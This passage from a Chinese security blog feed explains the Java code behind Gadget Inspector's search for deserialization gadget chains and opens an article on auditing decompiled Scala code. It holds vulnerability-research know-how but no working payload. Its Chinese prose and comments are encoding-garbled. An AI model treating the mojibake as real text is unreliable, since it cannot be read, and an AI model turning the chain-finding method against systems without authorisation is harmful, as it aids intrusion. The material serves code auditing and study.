(MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                    writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                    writer.write(method.getClassReference().getName());</span><br><span class="line">                    writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                    writer.write(method.getName());</span><br><span class="line">                    writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                    writer.write(method.getDesc());</span><br><span class="line">                    writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// åŠ è½½è°ƒç”¨å›¾å¹¶åˆå¹¶</span></span><br><span class="line">        <span class="comment">// graphCallMap é€šè¿‡ä¸»è°ƒæ–¹æ³•åå¥æŸ„æ˜ å°„å…¶æ‰€æœ‰è¢«è°ƒæ–¹æ³•è°ƒç”¨å›¾çš„é›†åˆ</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">GraphCall</span>.Factory())) &#123;</span><br><span class="line">            MethodReference.<span class="type">Handle</span> <span class="variable">caller</span> <span class="operator">=</span> graphCall.getCallerMethod();</span><br><span class="line">            <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">                Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                graphCalls.add(graphCall);</span><br><span class="line">                graphCallMap.put(caller, graphCalls);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                graphCallMap.get(caller).add(graphCall);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exploredMethods è®°å½•æ‰€æœ‰è¢«æŸ¥æ‰¾è¿‡çš„æ–¹æ³• é¿å…é‡å¤æœç´¢</span></span><br><span class="line">        Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// è®°å½•éœ€è¦æŸ¥æ‰¾çš„sourceæ–¹æ³• æ¯ä¸ªsourceè¢«å½“ä½œä¸€æ¡GadgetChain</span></span><br><span class="line">        LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// åŠ è½½å…¥å£ç‚¹</span></span><br><span class="line">        <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">Source</span>.Factory())) &#123;</span><br><span class="line">            <span class="comment">// å°è£…å…¥å£ç‚¹ä¸ºä¸€ä¸ªlink</span></span><br><span class="line">            <span class="type">GadgetChainLink</span> <span class="variable">srcLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainLink</span>(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å°†sourceç‚¹å°è£…çš„ GadgetChain åŠ å…¥åˆ°é¢„å¤„ç†åˆ—è¡¨ä¸­</span></span><br><span class="line">            methodsToExplore.add(<span class="keyword">new</span> <span class="title class_">GadgetChain</span>(Arrays.asList(srcLink)));</span><br><span class="line">            <span class="comment">// å°†å…¥å£ç‚¹åŠ å…¥åˆ°å·²æŸ¥æ‰¾é›†åˆä¸­</span></span><br><span class="line">            exploredMethods.add(srcLink);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">iteration</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// è¿­ä»£1000æ¬¡è®°å½•ä¸€æ¬¡</span></span><br><span class="line">            <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                LOGGER.info(<span class="string">&quot;Iteration &quot;</span> + iteration + <span class="string">&quot;, Search space: &quot;</span> + methodsToExplore.size());</span><br><span class="line">            &#125;</span><br><span class="line">            iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">GadgetChain</span> <span class="variable">chain</span> <span class="operator">=</span> methodsToExplore.pop();</span><br><span class="line">            <span class="comment">// å–å¾—é“¾ä¸­æœ€åä¸€ä¸ªlink</span></span><br><span class="line">            <span class="type">GadgetChainLink</span> <span class="variable">lastLink</span> <span class="operator">=</span> chain.links.get(chain.links.size()-<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// ä»linkä¸­è·å–åˆ°æ–¹æ³•å¥æŸ„ï¼Œæ ¹æ®æ–¹æ³•å¥æŸ„è·å–åˆ°è°ƒç”¨å›¾é›†åˆ</span></span><br><span class="line">            Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);</span><br><span class="line">            <span class="keyword">if</span> (methodCalls != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// éå†è°ƒç”¨å›¾</span></span><br><span class="line">                <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                    <span class="comment">// å¦‚æœè°ƒç”¨è¿™çš„å‚æ•°ç´¢å¼•ä¸é“¾ä¸­æœ€åä¸€ä¸ªlinkçš„taintedArgIndexä¸åŒï¼Œåˆ™è¯¥æ–¹æ³•è°ƒç”¨ä¸ç¬¦åˆè¦æ±‚ã€‚</span></span><br><span class="line">                    <span class="comment">// å³éœ€è¦è°ƒç”¨è€…çš„å‚æ•°å¯æ§</span></span><br><span class="line">                    <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// ä»è°ƒç”¨å›¾ä¸­æ‰¾åˆ°è¢«è°ƒç”¨æ–¹æ³•çš„å¥æŸ„ï¼Œç„¶åæŸ¥æ‰¾è¯¥æ–¹æ³•çš„æ‰€æœ‰é‡è½½æ–¹æ³•</span></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());</span><br><span class="line">                    <span class="comment">// éå†æ‰€æœ‰é‡è½½æ–¹æ³•</span></span><br><span class="line">                    <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                        <span class="comment">// å°†è¯¥æ–¹æ³•é‡æ–°å°è£…æˆä¸€ä¸ªlink ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–¹æ³•åå¥æŸ„  ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºè¯¥æ–¹æ³•å“ªä¸€ä¸ªå‚æ•°å¯ä»¥è¢«æ±¡æŸ“</span></span><br><span class="line">                        <span class="comment">// åœ¨å¯»æ‰¾ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ—¶éœ€è¦ä¿è¯ ç¬¬äºŒä¸ªå‚æ•° å‡ºç°åœ¨è°ƒç”¨å›¾å›¾ä¸­</span></span><br><span class="line">                        <span class="type">GadgetChainLink</span> <span class="variable">newLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainLink</span>(methodImpl, graphCall.getTargetArgIndex());</span><br><span class="line">                        <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// å½¢æˆæ–°çš„GadgetChain </span></span><br><span class="line">                        <span class="type">GadgetChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChain</span>(chain, newLink);</span><br><span class="line">                        <span class="comment">// å¦‚æœè¯¥é“¾çš„æœ€åä¸€ä¸ªlinkæ˜¯sinkç‚¹ï¼Œä¸”æ»¡è¶³æ±¡æŸ“å…³ç³» åˆ™è®¤ä¸ºæ‰¾åˆ°äº†ä¸€æ¡ååºåˆ—åŒ–Gadgetsé“¾</span></span><br><span class="line">                        <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;</span><br><span class="line">                            discoveredGadgets.add(newChain);</span><br><span class="line">                            <span class="comment">// å¦åˆ™ç»§ç»­å¯»æ‰¾</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// å°†æ–°é“¾åŠ å…¥åˆ°éœ€è¦å¯»æ‰¾çš„åˆ—è¡¨ä¸­</span></span><br><span class="line">                            methodsToExplore.add(newChain);</span><br><span class="line">                            <span class="comment">// å°†æ–°çš„æ–¹æ³•èŠ‚ç‚¹åŠ å…¥åˆ°å·²ç»è¢«æŸ¥æ‰¾è¿‡çš„æ–¹æ³•é›†åˆä¸­</span></span><br><span class="line">                            exploredMethods.add(newLink);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// è¾“å‡º</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> Files.newOutputStream(Paths.get(<span class="string">&quot;gadget-chains.txt&quot;</span>));</span><br><span class="line">             <span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">                printGadgetChain(writer, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOGGER.info(<span class="string">&quot;Found &#123;&#125; gadget chains.&quot;</span>, discoveredGadgets.size());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å…³äºå¦‚ä½• è¿æ¥Gadget Chainï¼Œè¿™é‡Œä¸¾ä¾‹è¯´æ˜ã€‚<br>ä»¥ä¸‹ä¸¤ä¸ªç±»Aä¸ç±»Båˆ†åˆ«å®ç°äº† Serializable æ¥å£ï¼Œå¹¶ä¸”éƒ½é‡å†™äº† readObject æ–¹æ³•ã€‚ è¿™é‡Œå°†ç±»Açš„ readObject æ–¹æ³•ä½œä¸º Source ç‚¹ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">B</span> <span class="variable">var2</span> <span class="operator">=</span> (B) var1.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readUTF();</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨è¿›è¡Œ Gadget Chain æ„é€ æ—¶é¦–å…ˆä¼šå°† A ç±»çš„ readObject æ–¹æ³•å°è£…ä¸ºä¸€ä¸ª GadgetChainLink å¯¹è±¡ï¼Œå…¶ç¬¬ä¸€ä¸ªå‚æ•°ä¸º readObject æ–¹æ³•åçš„å¥æŸ„ï¼Œ<br>ç¬¬äºŒä¸ªå‚æ•°ä¸ºå‚æ•°æ±¡ç‚¹ç´¢å¼•ï¼ˆ1ï¼‰ã€‚ç„¶åå°†è¿™ä¸ª GadgetChainLink æ·»åŠ åˆ°ä¸€ä¸ªæ•°ç»„ä¸­å†å°è£…åˆ° GadgetChain ä¸­ã€‚<br>æœç´¢æ—¶å…ˆä» GadgetChain ä¸­å–å‡ºåˆ—è¡¨ä¸­æœ€åä¸€ä¸ª linkï¼Œä¹Ÿå°±æ˜¯ A ç±» readObject æ–¹æ³•å°è£…çš„ GadgetChainLink å¯¹è±¡ã€‚ç„¶åè·å–åˆ°æ–¹æ³•åï¼Œ<br>å¹¶ä»è°ƒç”¨å›¾æ˜ å°„ä¸­é€šè¿‡æ–¹æ³•åå–å¾—ç±»Aæ–¹æ³•readObject çš„æ‰€æœ‰è°ƒç”¨å›¾ï¼Œæˆ‘ä»¬çš„ä¾‹å­ä¸­åªæœ‰ä¸€ä¸ªï¼Œå³è°ƒç”¨ç±»Bçš„readObjectæ–¹æ³•ã€‚<br>è¿™ä¸ªè°ƒç”¨å›¾åœ¨ callgraph.dat ä¸­æ˜¯è¿™æ ·çš„ï¼š<br>A   readObject  (Ljava&#x2F;io&#x2F;ObjectInputStream;)V  B   readObject   ()Ljava&#x2F;lang&#x2F;Object;     1         0<br>å–å¾—äº†è°ƒç”¨å›¾åä¼šæ¯”è¾ƒç±»Açš„ readObject æ–¹æ³•çš„å‚æ•°æ±¡ç‚¹ç´¢å¼•ï¼ˆ1ï¼‰æ˜¯å¦ä¸è°ƒç”¨å›¾ä¸­çš„è°ƒç”¨è€…å‚æ•°ç´¢å¼•ï¼ˆ1ï¼‰ä¸€è‡´ï¼Œåœ¨ç»™å‡ºçš„ä¾‹å­ä¸­ä¸¤è€…å‡ä¸º1ï¼Œè¡¨æ˜æ±¡ç‚¹å¯ä»¥ä¼ é€’ä¸‹å»ã€‚<br>ç„¶åæŸ¥æ‰¾ç±»Bçš„æ‰€æœ‰å®ç°ç±»æ˜¯å¦é‡å†™äº†readObjectæ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨é‡å†™ï¼Œåˆ™æ‰€æœ‰çš„é‡å†™æ–¹æ³•éƒ½å°†è¢«å°è£…ä¸ºæ–°çš„ GadgetChainLink å¯¹è±¡ï¼Œå¹¶å°†å®ƒä»¬æ·»åŠ åˆ° GadgetChain ä¸­ã€‚<br>è¿™ä¸ªæ–°çš„ GadgetChain æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‰ä¸€ä¸ªé“¾ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå½“å‰é“¾çš„æœ€åä¸€ä¸ªlinkã€‚ ç„¶ååˆ¤æ–­è¯¥é“¾çš„æœ€åä¸€ä¸ªlinkæ˜¯å¦æ˜¯sinkç‚¹ï¼Œå¦‚æœæ˜¯åˆ™è®¤ä¸ºæ‰¾åˆ°äº†ä¸€æ¡ååºåˆ—åŒ–Gadgetsé“¾ï¼Œå¦åˆ™ç»§ç»­å¯»æ‰¾ã€‚<br>æ–°ç”Ÿæˆçš„ GadgetChain ä¼šè¢«æ·»åŠ åˆ° methodsToExplore ä¸­å‚åŠ ä¸‹ä¸€è½®å¾ªç¯ã€‚  </p>
]]></content>
      <categories>
        <category>æ¼æŒ–å·¥å…·</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>Java Gadgets</tag>
        <tag>Gadget Inspector</tag>
        <tag>ååºåˆ—åŒ–åˆ©ç”¨é“¾</tag>
      </tags>
  </entry>
  <entry>
    <title>Scalaä»£ç å®¡è®¡ä»å…¥é—¨åˆ°å…¥åŸ</title>
    <url>/archives/2a377379.html</url>
    <content><![CDATA[<h1 id="Scalaä»£ç å®¡è®¡ä»å…¥é—¨åˆ°å…¥åŸ"><a href="#Scalaä»£ç å®¡è®¡ä»å…¥é—¨åˆ°å…¥åŸ" class="headerlink" title="Scalaä»£ç å®¡è®¡ä»å…¥é—¨åˆ°å…¥åŸ"></a>Scalaä»£ç å®¡è®¡ä»å…¥é—¨åˆ°å…¥åŸ</h1><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>Scala æ˜¯ä¸€é—¨å¤šèŒƒå¼çš„ç¼–ç¨‹è¯­è¨€ï¼Œé›†æˆäº†é¢å‘å¯¹è±¡ç¼–ç¨‹å’Œå‡½æ•°å¼ç¼–ç¨‹çš„å¤šç§ç‰¹æ€§ã€‚å‡½æ•°å¼ç¼–ç¨‹æŠ½è±¡çš„ç†è®ºåŸºç¡€ä¹Ÿè®©è¿™é—¨è¯­è¨€å˜å¾—æŠ½è±¡èµ·æ¥ï¼Œåˆå­¦è€…éœ€è¦èŠ±æ›´å¤šçš„æ—¶é—´å»ç†è§£å…¶ç‰¹æœ‰æ¦‚å¿µä»¥åŠä¼—å¤šçš„è¯­æ³•ç³–ã€‚<code>Scala</code>æ˜¯ä¸€é—¨è¿è¡Œåœ¨JVMå¹³å°ä¸Šçš„è¯­è¨€ï¼Œå…¶æºç ç¼–è¯‘ç»“æœç¬¦åˆ<code>Java</code>å­—èŠ‚ç è§„èŒƒï¼Œæ‰€ä»¥å¯ä»¥è¢«åç¼–è¯‘ä¸º<code>Java</code>ä»£ç ã€‚åœ¨è¿›è¡Œ<code>Scala</code>ä»£ç å®¡è®¡çš„è¿‡ç¨‹ä¸­ï¼Œå®¡è®¡è€…å¾ˆå°‘æœ‰æœºä¼šç›´é¢å…¶æºç ï¼Œå¤§å¤šæ•°æ—¶å€™éƒ½æ˜¯è¢«åç¼–è¯‘ä¸º<code>Java</code>çš„ä»£ç æ‰€æ”¯é…ã€‚<code>Scala</code>ä¸<code>Java</code>æ¯•ç«Ÿæ˜¯ä¸¤é—¨è¯­è¨€ï¼Œåç¼–è¯‘æˆ<code>Java</code>ä»£ç çš„åæœä¾¿æ˜¯ä¸§å¤±äº†åŠ¨æ€è°ƒè¯•çš„èƒ½åŠ›ï¼ˆè¿™ä¸ºå®¡è®¡è€…å¸¦æ¥äº†ä¸å°çš„éº»çƒ¦ï¼‰ï¼Œåç¼–è¯‘åäº§ç”Ÿçš„ä¸­é—´ä»£ç ã€ä¸´æ—¶å˜é‡ç­‰è¾…åŠ©ç»“æ„æ›´æ˜¯æå¤§å¾—é™ä½äº†ä»£ç çš„å¯è¯»æ€§ã€‚æœ¬æ–‡å°†å¸¦é¢†è¯¸ä½æŠ½ä¸å‰¥èŒ§é€æ­¥æ¢³ç†å‡º<code>Scala</code>å„è¯­æ³•ç»“æ„ä¸<code>Java</code>è¯­æ³•ç»“æ„å¯¹åº”å…³ç³»ï¼Œç„¶åä»¥ä¸¤ä¸ªæ¼æ´çš„åˆ†æç»“å°¾ã€‚  </p>
<span id="more"></span>
<h2 id="ç‰¹æ®Šè¯­æ³•ç»“æ„è¯†åˆ«"><a href="#ç‰¹æ®Šè¯­æ³•ç»“æ„è¯†åˆ«" class="headerlink" title="ç‰¹æ®Šè¯­æ³•ç»“æ„è¯†åˆ«"></a>ç‰¹æ®Šè¯­æ³•ç»“æ„è¯†åˆ«</h2><p>é™¤äº†å¾ªç¯ã€æ¡ä»¶åˆ¤æ–­ã€é¢å‘å¯¹è±¡ç­‰åŸºç¡€è¯­æ³•å¤–ï¼Œ<code>Scala</code>è¿˜æä¾›äº†æå…·ç‰¹è‰²çš„è¯­æ³•ç»“æ„ï¼Œå¦‚ï¼šæ¨¡å¼åŒ¹é…ã€éšå¼è½¬æ¢ã€ä¼ åè°ƒç”¨ã€å‡½æ•°æŸ¯é‡ŒåŒ–ã€ä¼´ç”Ÿå¯¹è±¡ã€ç‰¹è´¨ã€æå–å™¨ã€å‡½æ•°å¼ç¼–ç¨‹ç­‰ã€‚æœ¬ç« ä¸ä¼šé‡ç‚¹ç€å¢¨äºè¿™äº›è¯­æ³•çš„ä»‹ç»ï¼Œè€Œæ˜¯å‘è¯»è€…å±•ç¤ºåœ¨å°†<code>Scala</code>æºç¨‹åºåç¼–è¯‘ä¸º<code>Java</code>ä»£ç åäº§ç”Ÿçš„é‚£äº›ä¸å¤ªå¸¸è§„çš„è¯­æ³•ç»“æ„ä»¥åŠä¸€äº›å¥‡æ€ªçš„å˜é‡ï¼ˆMODULE$&#x2F;$outer&#x2F;package&#x2F;$init$ï¼‰ç­‰ã€‚</p>
<h3 id="ä¼´ç”Ÿå¯¹è±¡"><a href="#ä¼´ç”Ÿå¯¹è±¡" class="headerlink" title="ä¼´ç”Ÿå¯¹è±¡"></a>ä¼´ç”Ÿå¯¹è±¡</h3><blockquote>
<p>æœ¬èŠ‚å°†ä¼šæ¶‰åŠåˆ°ç‰¹æ®Šå˜é‡<code>MODULE$</code>çš„å«ä¹‰   </p>
</blockquote>
<p><code>Scala</code>ä¸­æ²¡æœ‰ç±»ä¼¼<code>Java</code>ä¸­<code>static</code>å…³é”®å­—ï¼Œå…¶å®ç°<code>static</code>å…³é”®å­—åŠŸèƒ½æ˜¯é€šè¿‡è¢«ç§°ä¸ºä¼´ç”Ÿå¯¹è±¡çš„æ¦‚å¿µã€‚<br>ä¼´ç”Ÿå¯¹è±¡æ˜¯ç±»è‡ªèº«å®šä¹‰çš„å•ä¸ªå®ä¾‹ï¼Œå¯ä»¥è¢«ç†è§£ä¸ºå½“å‰ç±»çš„ä¸€ä¸ªå•ä¾‹å¯¹è±¡ï¼ˆå¹¶ä¸æ˜¾å¼ä¾èµ–ä¸€ä¸ªç±»ï¼Œå¯ç‹¬ç«‹å­˜åœ¨ï¼‰ï¼Œä»¥ä¸‹ä»£ç å±•ç¤ºäº†ä¸€ä¸ªç±»çš„ä¼´ç”Ÿå¯¹è±¡ï¼š  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singletons</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">var</span> llac: <span class="type">String</span> = <span class="string">&quot;ä¹æ•å•Šï¼Œæˆ‘æ˜¯ä¼´ç”Ÿç±»çš„ç§æœ‰å±æ€§ï¼Œæˆ‘è¢«ä¼´ç”Ÿå¯¹è±¡è°ƒç”¨äº†&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">callSingleField</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">   <span class="comment">// è°ƒç”¨ä¼´ç”Ÿå¯¹è±¡çš„ç§æœ‰å±æ€§</span></span><br><span class="line">    println(<span class="type">Singletons</span>.call)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Singletons</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">var</span> call: <span class="type">String</span> = <span class="string">&quot;ä¹æ•å•Šï¼Œæˆ‘æ˜¯ä¼´ç”Ÿå¯¹è±¡çš„ç§æœ‰å±æ€§ï¼Œæˆ‘è¢«ä¼´ç”Ÿç±»è°ƒç”¨äº†&quot;</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">sayHello</span></span>(llac: <span class="type">String</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(llac)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> s: <span class="type">Singletons</span> = <span class="keyword">new</span> <span class="type">Singletons</span>()</span><br><span class="line">    <span class="comment">// è°ƒç”¨ä¼´ç”Ÿç±»çš„ç§æœ‰å±æ€§</span></span><br><span class="line">    sayHello(s.llac)</span><br><span class="line">    <span class="comment">// è°ƒç”¨ä¼´ç”Ÿç±»çš„ç§æœ‰æ–¹æ³•</span></span><br><span class="line">    s.callSingleField()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢æä¾›çš„ä»£ç ä¸­ï¼Œè¢«å…³é”®å­—<code>object</code>ä¿®é¥°çš„å¯¹è±¡è¢«ç§°ä¸ºç±»<code>Singletons</code>çš„ä¼´ç”Ÿå¯¹è±¡ï¼Œç±»<code>Singletons</code> è¢«ç§°ä¸º<code>object</code>å…³é”®å­—ä¿®é¥°çš„å¯¹è±¡çš„ä¼´ç”Ÿç±»ï¼Œä¸¤è€…å¯äº’ç›¸è°ƒç”¨å…¶ç§æœ‰å±æ€§ä»¥åŠæ–¹æ³•ã€‚<br><code>Scala</code>è¯­è¨€æ˜¯è¿è¡Œåœ¨<code>jvm</code>ä¸Šçš„ï¼Œå…¶æœ€ç»ˆç¼–è¯‘ç»“æœç¬¦åˆ<code>Java</code>å­—èŠ‚ç è§„èŒƒï¼Œäºæ˜¯ä¾¿å¯ä»¥å°†å…¶åç¼–è¯‘æˆä¸º<code>Java</code>ä»£ç è¿›è¡ŒæŸ¥çœ‹ï¼Œè™½ç„¶è¿™æ ·ä¼šå¾—åˆ°ä¸<code>Scala</code>æºä»£ç è¿¥ç„¶ä¸åŒçš„ä»£ç ç»“æ„å¹¶äº§ç”Ÿä¸€äº›ä¸­é—´ä»£ç ã€‚å®¡è®¡è€…åœ¨è¿›è¡Œ<code>Scala</code>ä»£ç å®¡è®¡æ—¶å¤§å¤šæ•°æ—¶å€™é¢å¯¹çš„éƒ½æ˜¯è¢«åç¼–è¯‘æˆä¸º<code>Java</code>ä»£ç çš„<code>Scala</code>ç¨‹åºï¼Œæ‰€ä»¥å¦‚ä½•å¿«é€Ÿé«˜æ•ˆåœ°è¯†åˆ«<code>Scala</code>ä»£ç è½¬æ¢åçš„è¯­è¨€ç»“æ„å°±å°¤ä¸ºé‡è¦ï¼Œç‰¹åˆ«æ˜¯ä¸€äº›ç‰¹æ®Šçš„å˜é‡ã€‚<br>ä»¥ä¸‹ä¾¿æ˜¯ä¸Šæ–‡<code>Scala</code>æºä»£ç åç¼–è¯‘æˆä¸º<code>Java</code>ä»£ç åçš„å½¢æ€  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.Predef.;</span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singletons</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">String</span> <span class="variable">org$example$Singletons$$llac</span> <span class="operator">=</span> <span class="string">&quot;ä¹æ•å•Šï¼Œæˆ‘æ˜¯ä¼´ç”Ÿç±»çš„ç§æœ‰å±æ€§ï¼Œæˆ‘è¢«ä¼´ç”Ÿå¯¹è±¡è°ƒç”¨äº†&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      Singletons$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">(<span class="keyword">final</span> String llac)</span> &#123;</span><br><span class="line">      Singletons$.MODULE$.sayHello(llac);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String org$example$Singletons$$llac() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.org$example$Singletons$$llac;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> org$example$Singletons$$llac_$eq(<span class="keyword">final</span> String x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.org$example$Singletons$$llac = x$<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> org$example$Singletons$$callSingleField() &#123;</span><br><span class="line">      .MODULE$.println(Singletons$.MODULE$.org$example$Singletons$$call());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from Singletons$.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.Predef.;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Singletons$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Singletons$ 